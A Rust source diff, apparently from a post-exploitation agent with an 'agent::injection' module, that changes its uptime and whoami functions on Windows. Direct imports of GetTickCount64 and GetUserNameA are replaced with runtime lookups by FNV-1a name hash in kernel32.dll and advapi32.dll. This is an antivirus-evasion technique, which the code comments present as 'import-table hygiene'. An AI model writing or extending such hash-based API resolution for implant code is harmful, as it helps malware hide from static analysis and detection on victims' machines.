@@ -45,7 +45,14 @@ pub fn register(engine: &mut Engine) {
         }
         #[cfg(target_os = "windows")]
         {
-            extern "system" { fn GetTickCount64() -> u64; }
+            // Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+            unsafe fn GetTickCount64() -> u64 {
+                type F = unsafe extern "system" fn() -> u64;
+                static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+                let p = *P.get_or_init(|| crate::agent::injection::win_resolve::resolve_ptr(b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetTickCount64")));
+                let f: F = unsafe { std::mem::transmute(p) };
+                unsafe { f() }
+            }
             ((unsafe { GetTickCount64() } / 1000) as i64).to_string()
         }
     });
@@ -76,7 +83,14 @@ pub fn register(engine: &mut Engine) {
 fn whoami_native() -> String {
     #[cfg(target_os = "windows")]
     unsafe {
-        extern "system" { fn GetUserNameA(buf: *mut i8, sz: *mut u32) -> i32; }
+        // Lazily resolved from advapi32.dll by name hash (import-table hygiene).
+        unsafe fn GetUserNameA(buf: *mut i8, sz: *mut u32) -> i32 {
+            type F = unsafe extern "system" fn(*mut i8, *mut u32) -> i32;
+            static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+            let p = *P.get_or_init(|| crate::agent::injection::win_resolve::resolve_ptr(b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetUserNameA")));
+            let f: F = unsafe { std::mem::transmute(p) };
+            unsafe { f(buf, sz) }
+        }
         let mut buf = vec![0i8; 256];
         let mut sz  = 256u32;
         if GetUserNameA(buf.as_mut_ptr(), &mut sz) != 0 {
